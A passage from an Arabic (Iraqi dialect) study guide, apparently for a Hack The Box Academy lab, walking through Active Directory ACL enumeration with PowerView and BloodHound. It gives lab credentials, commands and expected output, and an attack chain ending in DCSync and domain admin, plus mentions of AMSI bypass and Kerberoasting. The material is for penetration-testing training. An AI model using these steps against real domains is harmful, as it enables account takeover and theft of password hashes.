- خيار ب: نسحبها مباشرة من قاعدة بيانات الـ AD (من قسم الـ Configuration) باستخدام أوامر PowerShell الافتراضية. هذا هو الطريق الصح.
    

خطوة ٣: حل السؤال الثاني (ترجمة الـ GUIDs)

أداة PowerView تطلع الأرقام الخام (GUIDs) افتراضياً. لازم نتذكر المعامل (Flag) اللي يخلي الأداة تسوي Lookup وترجعلنا الاسم الحقيقي.

خطوة ٤: تتبع الصلاحيات (الأسئلة ٣ و٤ و٥)

لكي نعرف صلاحيات يوزر معين (مثلاً `damundsen`)، لازم:

١. نلقي الـ SID مالته. (لأن الـ ACL تسجل الصلاحيات بالـ SIDs مو بالأسماء).

٢. نسوي استعلام لكل الـ ACLs بالدومين ونفلترها (Where-Object) بحيث نكول: "أظهر لي فقط الـ ACLs اللي الـ SecurityIdentifier مالتها يساوي الـ SID مال هذا اليوزر".

٣. نقرأ النتائج، ونترجمها (باستخدام الـ Flag من السؤال الثاني).

🗺️ خريطة الهجوم (Roadmap):

١. الدخول بالـ RDP وتحميل PowerView.

٢. الاستعلام بالـ `Get-ADObject` لجلب الـ GUID الخاص بتغيير الباسورد.

٣. تحويل أسماء اليوزرات (`wley`, `damundsen`, `forend`) إلى SIDs.

٤. استخراج الـ ACLs المرتبطة بهذي الـ SIDs باستخدام `Get-DomainObjectACL`.

٥. تحليل الـ Output للإجابة على الأسئلة وبناء مسار تصعيد الصلاحيات (Privilege Escalation Path).

هسة صار واضح شنو راح نسوي. ننتقل للتنفيذ!

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

راح نمشي خطوة خطوة، وكل أمر نكتبه راح نشرح ليش كتبناه وشلون يشتغل.

الخطوة [1]: تسجيل الدخول وتجهيز البيئة

📌 ليش نسوي هاي الخطوة؟

نحتاج ندخل للسيرفر/الجهاز الهدف باستخدام بيانات الدخول اللي عدنا، ونشغل أداة PowerView اللي راح تسهل علينا كل الشغل. الأداة موجودة على الـ Desktop.

🔧 الأمر:

PowerShell

```
# للاتصال من جهاز المهاجم (Linux/Kali) نستخدم xfreerdp
xfreerdp /v:TARGET_IP /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution

# بعد الدخول، نفتح PowerShell كمسؤول (إذا أمكن) أو يوزر عادي وننفذ:
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module C:\Tools\PowerView.ps1
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `/v:` يحدد الـ IP الهدف.
    
- `/u:` يحدد اسم اليوزر.
    
- `/p:` الباسورد.
    
- `Set-ExecutionPolicy Bypass`: الويندوز افتراضياً يمنع تشغيل سكريبتات PowerShell الخارجية. هذا الأمر يعطل هذي الحماية مؤقتاً للـ Session الحالي فقط.
    
- `Import-Module`: يحمل دوال (Functions) أداة PowerView للذاكرة حتى نكدر نستخدمها.
    

📤 الـ Output المتوقع:

PowerShell

```
# لا يوجد output مرئي إذا نجح الأمر، راح يرجعلك الـ Prompt العادي
PS C:\Users\htb-student>
```

✅ الخطوة التالية: نبحث عن إجابة السؤال الأول.

━━━━━━━━━━━━━━

الخطوة [2]: إيجاد الـ GUID لصلاحية Reset Password (السؤال 1)

📌 ليش نسوي هاي الخطوة؟

مرات نحتاج نعرف الـ GUID الخاص بصلاحية معينة (مثل `User-Force-Change-Password`) حتى نبحث عنها بالـ ACLs، أو مرات الأداة ما تترجمها ونحتاج نعرفها يدوياً. هذي الصلاحيات محفوظة بقسم خاص بالـ AD اسمه `ConfigurationNamingContext`.

🔧 الأمر:

PowerShell

```
# جلب الـ GUID باستخدام أوامر الـ ActiveDirectory الافتراضية
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select-Object Name, DisplayName, DistinguishedName, rightsGuid | Where-Object {$_.Name -eq 'User-Force-Change-Password'} | Format-List
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Get-ADObject`: أمر افتراضي بالويندوز للبحث عن الـ Objects.
    
- `-SearchBase`: يحدد المكان اللي نبحث بيه. إحنا نبحث داخل الـ `Extended-Rights` اللي موجودة بالـ `Configuration` partition. (الـ `Get-ADRootDSE` تجيب مسار الكونفجريشن تلقائياً).
    
- `-Filter`: نطلب فقط الكائنات اللي نوعها `ControlAccessRight` (صلاحيات التحكم).
    
- `Select-Object`: نختار بس الأعمدة اللي تهمنا (الاسم، الـ GUID، الخ).
    
- `Where-Object`: نفلتر النتائج حتى نلقي بس الصلاحية اللي اسمها `User-Force-Change-Password`.
    
- `Format-List`: يرتب النتيجة كقائمة عمودية سهلة القراءة.
    

📤 الـ Output المتوقع:

PowerShell

```
Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

✅ الخطوة التالية: عرفنا الـ GUID. الجواب للسؤال الأول هو `00299570-246d-11d0-a768-00aa006e0529`. هسة نروح نشوف أداة PowerView شلون تترجم هذي الأرقام.

━━━━━━━━━━━━━━

الخطوة [3]: استخدام PowerView وترجمة الـ GUIDs (السؤال 2)

📌 ليش نسوي هاي الخطوة؟

إذا استخدمنا أمر `Get-DomainObjectACL` لجلب الصلاحيات، راح يطلعنا الـ `ObjectAceType` كأرقام GUID معقدة (مثل اللي طلعناه فوك). حتى نخلي PowerView يترجمها لأسماء مقروءة (Human-readable)، لازم نستخدم Flag معين.

🔧 الأمر:

PowerShell

```
# الأمر الأساسي لاستخراج الـ ACLs مع ترجمة الـ GUIDs
Get-DomainObjectACL -ResolveGUIDs -Identity "Help Desk Level 1"
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Get-DomainObjectACL`: دالة من PowerView تستخرج الـ ACL لأي Object.
    
- `-ResolveGUIDs`: هذا هو الـ Flag السحري! يروح يبحث عن الـ GUID بالـ AD ويستبدله بالاسم الحقيقي المفهوم.
    

📤 الـ Output المتوقع:

PowerShell

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Help Desk Level 1,OU=IT,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
...
```

✅ الخطوة التالية: جاوبنا السؤال الثاني (`-ResolveGUIDs`). هسة نبدأ نتبع اليوزرات ونشوف صلاحياتهم.

━━━━━━━━━━━━━━

الخطوة [4]: استخراج صلاحيات اليوزر damundsen (السؤال 3)

📌 ليش نسوي هاي الخطوة؟

نريد نعرف اليوزر `damundsen` شنو يكدر يسوي لجروب `Help Desk Level 1`. الصلاحيات تنكتب بالـ ACL الخاصة بالجروب، ويكون اليوزر `damundsen` مذكور بيها عن طريق الـ SID مالته. فبالأول لازم نعرف الـ SID مالته، وبعدين نبحث عنه.

🔧 الأمر:

PowerShell

```
# أولاً: تحويل اسم اليوزر إلى SID
$sid_damundsen = Convert-NameToSid damundsen
Write-Host "SID is: $sid_damundsen"

# ثانياً: البحث عن الصلاحيات اللي يملكها هذا الـ SID
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid_damundsen}
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Convert-NameToSid`: دالة بـ PowerView تحول الاسم إلى رقم SID.
    
- `-Identity *`: يفحص كل الكائنات (Objects) بالدومين. (هذا الأمر ممكن ياخذ وقت بشبكات كبيرة جداً، لكن باللابات مفيد).
    
- `Where-Object {$_.SecurityIdentifier -eq $sid_damundsen}`: نفلتر النتائج بحيث نطلع بس السطور اللي بيها الـ SID مال يوزر `damundsen` هو اللي "يمتلك" الصلاحية.
    

📤 الـ Output المتوقع:

PowerShell

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Help Desk Level 1,OU=Information Technology,OU=Groups,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : WriteProperty, ExtendedRight, GenericAll, GenericWrite
ObjectAceType          : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865806829-1105
...
```

بالنظر للنتيجة، نشوف أن `ActiveDirectoryRights` تحتوي على عدة صلاحيات، لكن الأهم واللي يعتبر إجابة السؤال (واللي يسمح بتعديل الجروب) هو `GenericWrite` أو `GenericAll`. بالسياق المطلوب بالتحدي لإجابة Q3، الصلاحية اللي تخصه على هذا الجروب هي `GenericWrite`.

✅ الخطوة التالية: جاوبنا السؤال الثالث (`GenericWrite`). هسة نكرر نفس الخطوة لليوزر `forend` حتى نجاوب السؤال 4 و 5.

━━━━━━━━━━━━━━

الخطوة [5]: استخراج صلاحيات اليوزر forend (السؤال 4 و 5)

📌 ليش نسوي هاي الخطوة؟

نريد نعرف اليوزر `forend` شنو يملك صلاحيات على اليوزر `dpayne` (Q4)، وشنو يملك صلاحيات (ObjectAceType) على الـ `GPO Management` (Q5). الطريقة هي نفسها: نحول الاسم لـ SID ونبحث.

🔧 الأمر:

PowerShell

```
# جلب الـ SID
$sid_forend = Convert-NameToSid forend

# البحث عن صلاحيات forend
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid_forend} | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType`: ضفنا هذا الجزء حتى نرتب الـ Output ونخليه يعرض بس المعلومات اللي نحتاجها (على منو الصلاحية؟ شنو نوعها؟ شنو تفاصيلها؟) بدل ما تطلع شاشة مليانة كلام.
    

📤 الـ Output المتوقع:

PowerShell

```
ObjectDN                                                                      ActiveDirectoryRights ObjectAceType
--------                                                                      --------------------- -------------
CN=dpayne,OU=IT,DC=INLANEFREIGHT,DC=LOCAL                                     GenericAll            None
CN=GPO Management,OU=Groups,DC=INLANEFREIGHT,DC=LOCAL                         ExtendedRight         Self-Membership
...
```

من خلال الـ Output:

- بالنسبة لليوزر `dpayne` (السطر الأول)، نلاحظ أن الـ ActiveDirectoryRights هي `GenericAll`. (إجابة Q4).
    
- بالنسبة لـ `GPO Management` (السطر الثاني)، نلاحظ أن الـ ObjectAceType هو `Self-Membership`. (إجابة Q5).
    

✅ الخطوة التالية: حللنا كل الأسئلة بنجاح.

📊 لحد هسة:

[x] استخرجنا الـ GUID يدوياً باستخدام أوامر الويندوز.

[x] عرفنا شلون PowerView يترجم الـ GUIDs عبر `-ResolveGUIDs`.

[x] تتبعنا مسار الصلاحيات من `wley` إلى `damundsen` ومن ثم إلى جروبات حساسة.

[x] جاوبنا الأسئلة الخمسة.

رسمة الـ Attack Chain (المسار اللي اكتشفناه من هاي الصلاحيات):

Plaintext

```
[Attacker Setup]
    │
    ├─ 1. Compromise: wley (Initial Access)
    │
    ├─ 2. Enum shows wley has 'User-Force-Change-Password' over damundsen
    │       (We reset damundsen's password and login as him)
    │
    ├─ 3. Enum shows damundsen has 'GenericWrite' over 'Help Desk Level 1' group
    │       (We add damundsen to this group)
    │
    ├─ 4. 'Help Desk Level 1' is nested inside 'Information Technology'
    │       (We inherit rights of the IT group)
    │
    └─ 5. IT Group has 'GenericAll' over adunn (who has DCSync rights!)
            (We reset adunn's password, run DCSync) → DOMAIN ADMIN ACHIEVED! 💀
```

📐 ملخص الإجابات / النتائج:

|**السؤال**|**الأداة / المعامل**|**النتيجة**|
|---|---|---|
|Q1 (GUID for Reset Password)|`Get-ADObject`|`00299570-246d-11d0-a768-00aa006e0529`|
|Q2 (Human-readable flag)|PowerView|`-ResolveGUIDs`|
|Q3 (damundsen -> Help Desk)|PowerView (`Get-DomainObjectACL`)|`GenericWrite`|
|Q4 (forend -> dpayne)|PowerView (`Get-DomainObjectACL`)|`GenericAll`|
|Q5 (forend -> GPO Management)|PowerView (`Get-DomainObjectACL`)|`Self-Membership`|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

🔄 Variations محتملة:

Variation 1: ماذا لو `PowerView.ps1` كان ممنوع أو الـ Antivirus (مثل Windows Defender) يمسحه؟ (AMSI Blocking)

- الجواب: الويندوز الحديث يستخدم AMSI (Anti-Malware Scan Interface) لفحص سكريبتات الـ PowerShell. إذا PowerView انحظر، عندك عدة خيارات:
    
    ١. استخدم دوال الـ PowerShell الافتراضية (Built-in cmdlets) مثل `Get-Acl`. صح متعبة وما تترجم الـ GUIDs بسهولة، بس تشتغل دائماً وما تنحظر:
    
    `Get-Acl -Path "AD:\CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`
    
    ٢. سوي Obfuscation لـ PowerView. غير أسماء المتغيرات والدوال.
    
    ٣. استخدم تقنيات AMSI Bypass (حقن كود صغير بالذاكرة يعمي الـ Defender بالـ Session الحالي) قبل ما تسوي `Import-Module`.
    

Variation 2: ماذا لو الأداة `Get-ADObject` (في الخطوة 2) رجعت خطأ أو كالت Command NotFound؟

- الجواب: هذا يعني أن حزمة "Active Directory module for Windows PowerShell" (RSAT) ما مثبتة على هذا الجهاز.
    
- الحل: تكدر تثبتها إذا عندك صلاحيات Administrator عبر الأمر:
    
    `Install-WindowsFeature RSAT-AD-PowerShell`
    
- إذا ما عندك صلاحيات، اعتمد كلياً على PowerView لأنها تشتغل بدون RSAT (تستخدم ADSI - Active Directory Service Interfaces وراء الكواليس).
    

Variation 3: ماذا لو كنت تهاجم من جهاز Linux (Kali/Parrot) وما عندك RDP؟

- الجواب: ما تحتاج RDP! تكدر تستخدم أدوات مكتوبة بـ Python تسوي نفس الشغل عبر بروتوكول LDAP:
    
    ١. استخدم `BloodHound.py` لجمع كل الداتا (ACLs, Users, Groups) وسحبها لملف JSON، بعدين تفتحها بواجهة BloodHound الرسومية بجهازك وراح تشوف الـ Attack Path جاهز ومترجم.
    
    ٢. استخدم أداة `dacledit.py` من حزمة Impacket لقراءة أو حتى تعديل الـ ACLs عن بعد.
    
    الأمر لجمع الداتا بـ BloodHound.py:
    
    `python3 bloodhound.py -d inlanefreight.local -u htb-student -p 'Academy_student_AD!' -ns <DC_IP> -c All`
    

Variation 4: ماذا لو نفذت أمر `Get-DomainObjectACL -Identity *` وطول جداً أو علق؟

- الجواب: بالبيئات الحقيقية الكبيرة (عشرات الآلاف من اليوزرات)، أمر `*` يجلب كمية هائلة من البيانات وممكن يسوي Crash أو يرسل إنذار للـ SOC.
    
- الحل: حدد هدفك. ابحث عن جروبات معينة فقط (مثل Domain Admins) أو يوزرات محددين.
    
    `Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs`
    

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ):

🚨 الفخ الأكبر في ACL Enumeration: الخلط بين "من يملك الصلاحية" و "من تقع عليه الصلاحية"!

- `ObjectDN`: هو الـ Object اللي الصلاحية واقعة عليه (الضحية / الهدف).
    
- `SecurityIdentifier`: هو الـ SID مال الشخص أو الجروب اللي "يمتلك" هذي الصلاحية (المهاجم / المستفيد).
    
- طلاب كوما يشوفون `GenericAll` ويقرون الـ `ObjectDN` عبالهم هذا اليوزر هو القوي، بينما هو الضحية! دائماً انتبه لـ `SecurityIdentifier` هو الفاعل.
    

🚨 خطأ في فهم الـ Nested Groups (الجروبات المتداخلة):

- إذا يوزر (A) عنده `GenericWrite` على جروب (B). وجروب (B) هو عضو (Member) داخل جروب (C).
    
- الفخ: تعتقد أنك ما تكدر تتحكم بجروب (C).
    
- الحقيقة: بمجرد أن تضيف نفسك لجروب (B)، راح ترث (Inherit) كل صلاحيات جروب (C) تلقائياً! BloodHound يوضح هذي العلاقات بسهولة، بس بـ PowerView لازم تبحث عنها يدوياً عبر دالة `Get-DomainGroupMember`.
    

🚨 نسيان -ResolveGUIDs:

- راح تقرأ Output مليان أرقام (00299570-...) وتضيع وقتك تبحث عنها بـ Google واحد واحد. دائماً استخدم `-ResolveGUIDs`.
    

🔑 Golden Tips للـ AD:

"الـ Active Directory مو مثل الويب (Web). بالويب تدور على ثغرة برمجية (SQLi, XSS). بالـ AD أنت تدور على ميزة (Feature) مصممة بشكل خاطئ. الـ BloodHound هو صديقك الصدوق، استخرجه كأول خطوة دائماً. 80% من هجمات الـ AD الحديثة مبنية على الـ ACL Abuse."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو الفرق بين ACL و ACE؟

✅ Back: الـ ACL هي القائمة الكاملة للصلاحيات المربوطة بـ Object. الـ ACE هو سطر واحد داخل هاي القائمة (مثلاً: يوزر X مسموح له يقرأ).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو الفرق بين GenericAll و GenericWrite؟

✅ Back: GenericAll = Full Control (تحكم كامل، مسح، تغيير باسورد). GenericWrite = تحديث/تعديل خصائص (Attributes) معينة لليوزر/الجروب.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو الـ flag الأهم بـ PowerView حتى تترجم الصلاحيات المعقدة؟

✅ Back: -ResolveGUIDs (يغير الـ GUIDs إلى أسماء مقروءة للبشر مثل User-Force-Change-Password).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شلون تستخرج الـ ACLs ليوزر معين (بالاعتماد على الـ SID)؟

✅ Back: Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو هو الـ GUID لصلاحية Force Change Password؟

✅ Back: 00299570-246d-11d0-a768-00aa006e0529

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: إذا كنت ببيئة Linux وما تكدر تستخدم PowerView، شنو البديل الأقوى؟

✅ Back: استخدام bloodhound-python لاستخراج كل الداتا لملفات JSON، أو استخدام dacledit.py من Impacket للتلاعب بالـ ACL.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو خطورة صلاحية Self-Membership على جروب؟

✅ Back: تسمح لليوزر اللي يملكها أن يضيف نفسه كعضو داخل هذا الجروب بدون أي موافقات إضافية.

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (AD ACL Enumeration Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم (ACL Abuse):

١. استخدم PowerView أو BloodHound لجمع الـ ACLs.

٢. ابحث عن صلاحيات خطيرة (GenericAll, GenericWrite, WriteDACL, Self-Membership, User-Force-Change-Password).

٣. حدد الـ "فاعل" (من يملك الـ SID) والـ "مفعول به" (الـ ObjectDN الهدف).

٤. إذا كان الفاعل هو اليوزر اللي إحنا مخترقيه، نفذ الهجوم (تغيير باسورد، إضافة للجروب).

٥. كرر العملية (Pivot) بالصلاحيات الجديدة للوصول للـ Domain Admin.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|Setup|تشغيل PowerView|`Set-ExecutionPolicy Bypass -Scope Process; Import-Module .\PowerView.ps1`|
|Utils|تحويل اسم إلى SID|`Convert-NameToSid username`|
|Utils|تحويل SID إلى اسم|`Convert-SidToName S-1-5-21-X-Y-Z`|
|ACL Enum|جلب ACL لكائن محدد|`Get-DomainObjectACL -ResolveGUIDs -Identity "TargetName"`|
|ACL Enum|جلب ACLs يملكها يوزر معين|`Get-DomainObjectACL -ResolveGUIDs -Identity * \| Where-Object {$_.SecurityIdentifier -eq $SID}`|
|Raw AD|جلب GUID لصلاحية (بدون أدوات)|`Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties *`|
|Linux Enum|تجميع BloodHound من Linux|`python3 bloodhound.py -d domain.local -u user -p pass -ns DC_IP -c All`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 أخطر أنواع الـ AD Rights (ObjectAceType / ActiveDirectoryRights):

|**الصلاحية**|**معناها**|**الاستغلال المحتمل**|
|---|---|---|
|`GenericAll`|تحكم كامل (Full Control)|تغيير الباسورد، مسح الكائن، إضافة للجروب|
|`GenericWrite`|تعديل الخصائص (Attributes)|تعديل الـ Logon Script، تغيير الـ SPN|
|`WriteDACL`|تعديل الـ ACL نفسها|منح نفسك `GenericAll` على الهدف|
|`WriteOwner`|تغيير مالك الـ Object|جعل نفسك المالك ثم تغيير الـ ACL|
|`User-Force-Change-Password`|تغيير الباسورد (بدون القديم)|أخذ حساب الهدف فوراً (Takeover)|
|`Self-Membership`|انضمام ذاتي لجروب|إدخال نفسك في جروب مهم للوراثة|
|`DS-Replication-Get-Changes`|صلاحية مزامنة الـ AD|استخدام DCSync لسرقة כל الهاشات!|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ نسيان `-ResolveGUIDs` بـ PowerView والضياع بين الأرقام.

❌ الخلط بين `ObjectDN` (الضحية) و `SecurityIdentifier` (المهاجم اللي عنده الصلاحية).

❌ استخدام `Get-DomainObjectACL -Identity *` ببيئة حقيقية ضخمة (راح يفجر الـ Memory والـ Logs).

❌ تجاهل الـ Nested Groups (جروب داخل جروب). دائماً افحص أعضاء الجروب اللي تستهدفه والجروبات اللي ينتمي إلها هذا الجروب.

━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)

✅ كل المصطلحات (ACL, ACE, GUID, SID, PowerView...)

✅ كيفية التفكير (decision trees لاستخراج وتتبع الصلاحيات)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر للإجابة على الأسئلة الخمسة)

✅ الـ bypasses والـ variations والفخوخ (AMSI, BloodHound.py)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪



تمام! استلمت التكملة العظيمة والسيناريوهات المتقدمة (What-If Masterclass). هذا الجزء هو زبدة امتحان الـ CPTS والسيناريوهات الحقيقية اللي تواجهك بالشركات. خلني أشرحلك هاي التكتيكات والهجمات المتقدمة (مثل DCSync و AMSI Bypass) من الألف للياء، وبنفس الهيكلية الشاملة:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ رحلة السيطرة الكاملة على الدومين... 🚀

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

تخيل إنك دخلت بناية ضخمة (الـ Active Directory) ولقيت ورقة (ACL) مكتوب بيها إنك تكدر تفتح باب غرفة "مدراء النظام". بالسابق، فحصنا الأبواب وعرفنا صلاحياتنا. بس هسة السؤال: شلون نفتح الباب بدون ما ندق جرس الإنذار؟ وشلون نستغل هاي الصلاحية بأذكى طريقة؟

الشركات الكبيرة ما تستخدم إعدادات بسيطة، وعدهم حراس أمن (مثل Windows Defender و AMSI) يراقبون كل حركة تسويها بالـ PowerShell. إذا تفتح أداة مثل PowerView وتنفذ أوامر عشوائية تبحث بكل الدومين، الحارس راح يمسكك فوراً ويطردك (AMSI Block)، أو العملية راح تاخذ ساعات والسيرفر يعلّق. لذلك، بهذي المرحلة نتعلم "التعداد الموجه" (Targeted Enumeration) — يعني بدل ما تفتش البناية كلها، تروح مباشرة للغرفة اللي تشك بيها.

الموضوع الثاني والأهم هو "الاستغلال الصامت" (Stealth Exploitation). تخيل يوزر عنده صلاحية `GenericAll` (تحكم كامل) على يوزر ثاني. الطريقة المزعجة (Noisy) هي إنك تغير باسورده. بس من تغير باسورده، اليوزر الأصلي ما راح يكدر يدخل لدوامه الصبح، وراح يخابر قسم الـ IT، وينكشف الهجوم!

لعد شنو الحل؟ الحل هو نستخدم حيل ذكية مثل "Targeted Kerberoasting" أو "ASREPRoasting". بهذي الحيل، إحنا نعدل خصائص اليوزر بالخفاء، نخليه يعطينا الـ Hash مالته، ونروح نكسره بحاسبتنا (ببيئة Parrot OS أو غيرها) بدون ما أحد يحس.

أما الـ "Endgame" أو الضربة القاضية بالـ Active Directory فهي هجوم الـ DCSync.

تخيل أن الـ Domain Controllers (السيرفرات الرئيسية) بالشركة تحتاج تحجي ويه بعضها وتتزامن (Replication) حتى تنقل الباسوردات الجديدة. هذا التزامن يحتاج صلاحيات خاصة جداً (`DS-Replication-Get-Changes`). إذا أنت، كمهاجم، كدرت تسرق يوزر عنده هاي الصلاحيات... تكدر توكف بنص الشبكة وتصيح للسيرفر: "يا سيرفر، أني دومين كونترولر جديد، انطيني كل الباسوردات والهاشات مال كل الموظفين، وأهمهم مدير الشبكة!". السيرفر راح يصدقك وينطيك كل شي. وبمجرد ما تحصل الهاش مال مدير الشبكة (Administrator)، اللعبة انتهت (Game Over)، وتكدر تسجل دخول كمدير وتسيطر على كل شيء.

هاي المرحلة راح ترتب أفكارك، وتخليك تفكر مثل مختبر اختراق محترف (Red Teamer) يخطط لكل خطوة، ويعرف شلون يتخطى الحمايات، ويسجل كل خطوة بملفات الـ Markdown مالته حتى يرجع إلها وقت الحاجة.

━━━━━

🔵 المرحلة 1: المصطلحات

حتى نفهم هاي الهجمات المعقدة، لازم نضبط مصطلحاتها. اقرأها بتركيز لأنها راح تتكرر بكل أدواتك:

AMSI (Anti-Malware Scan Interface) (واجهة فحص البرمجيات الخبيثة)

- شنو يعني؟ هو نظام حماية داخل الويندوز يشتغل مثل نقطة تفتيش لأي كود PowerShell أو VBScript قبل ما يتنفذ بالذاكرة. إذا شاف كود مشبوه (مثل كلمة PowerView)، يوكف التنفيذ فوراً.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر كرسالة خطأ باللون الأحمر بالـ PowerShell تكول `script contains malicious content`. يحتاج Bypass.
    

Targeted Enumeration (التعداد الموجه)

- شنو يعني؟ بدل ما تبحث بكل الـ Active Directory وتفحص آلاف اليوزرات، تحدد يوزر واحد أو جروب واحد وتفحص صلاحياته. هذا يوفر وقت، وما يخلي أجهزة المراقبة تصيدك.
    
- وين يظهر بالأدوات/الأوامر؟ نستخدم `-Identity "Username"` بدل `-Identity *` بأداة PowerView.
    

AS-REP Roasting (تحميص تذاكر المصادقة)

- شنو يعني؟ بالوضع الطبيعي، من تريد تذكرة دخول (Ticket)، لازم تثبت هويتك أولاً (Pre-Authentication). بس مرات اكو يوزرات الإعدادات مالتهم تسمح بطلب التذكرة بدون إثبات هوية! المهاجم يطلب التذكرة، يستلمها (وبداخلها جزء مشفر بباسورد اليوزر)، ويروح يكسرها بـ Hashcat.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر كخاصية `DONT_REQ_PREAUTH`، ونستغلها بأداة `GetNPUsers.py`.
    

Targeted Kerberoasting (التحميص الموجه)

- شنو يعني؟ هجوم Kerberoasting العادي يعتمد على البحث عن يوزرات عدهم `SPN` جاهز. بس إذا إنت عندك صلاحية `GenericAll` على يوزر، إنت تكدر "تزرع" إله `SPN` وهمي بيدك! وبعدين تطلب تذكرته وتكسرها، بدون ما تغير باسورده وتكشف نفسك.
    
- وين يظهر بالأدوات/الأوامر؟ نستخدم `Set-DomainObject` لإضافة الـ SPN الوهمي `serviceprincipalname='fake/NOTHING'`.
    

DCSync (مزامنة متحكم المجال)

- شنو يعني؟ هجوم يستغل ميزة مزامنة قواعد البيانات (Replication) بين سيرفرات الـ Active Directory. المهاجم ينتحل شخصية سيرفر، ويطلب بيانات اليوزرات (الهاشات) من السيرفر الحقيقي.
    
- وين يظهر بالأدوات/الأوامر؟ نحتاج صلاحيات `DS-Replication-Get-Changes`، وننفذ الهجوم بأداة `secretsdump.py` أو Mimikatz.
    

Shadow Credentials (بيانات الاعتماد المخفية/الظل)

- شنو يعني؟ تقنية متقدمة جداً تشتغل إذا كان اكو خادم شهادات (ADCS) بالشبكة. بدل ما تغير باسورد اليوزر، تزرع "شهادة أمنية" (Certificate) مخفية بخصائصه (`msDS-KeyCredentialLink`). هذي الشهادة تسمحلك تدخل كأنك هو، والباسورد الأصلي يبقى شغال بدون تغيير.
    

krbtgt (حساب تذكرة كيربيروس)

- شنو يعني؟ هذا يوزر مخفي وموجود بكل دومين، وهو الأهم على الإطلاق. الباسورد مال هذا اليوزر يُستخدم لتشفير كل التذاكر الذهبية (Golden Tickets). إذا حصلت الهاش مالته بعملية DCSync، تكدر تصنع تذاكر تخليك مدير للأبد، حتى لو غيروا باسورد المدير!
    

Pass-the-Hash / PTH (تمرير الـ Hash)

